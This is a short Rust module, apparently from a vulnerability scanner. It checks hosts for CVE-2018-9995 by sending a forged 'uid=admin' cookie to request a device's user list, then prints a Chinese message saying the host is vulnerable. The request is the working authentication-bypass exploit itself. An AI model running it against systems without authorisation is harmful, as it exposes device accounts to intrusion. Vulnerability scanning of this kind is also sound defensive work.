use reqwest::{header::HeaderMap, Client};

// todo
pub async fn run(ip: &str, client: Client) {
    let mut headers = HeaderMap::new();
    headers.insert("Cookie", "uid=admin".parse().unwrap());
    let req = client
        .get(format!("http://{ip}/device.rsp?opt=user&cmd=list"))
        .headers(headers)
        .send()
        .await;

    match req {
        Ok(resp) => {
            if resp.status().is_success() {
                println!("{ip} 存在 CVE-2018-9995 漏洞");
            }
        }
        Err(_) => {
            // no
        }
    }
}
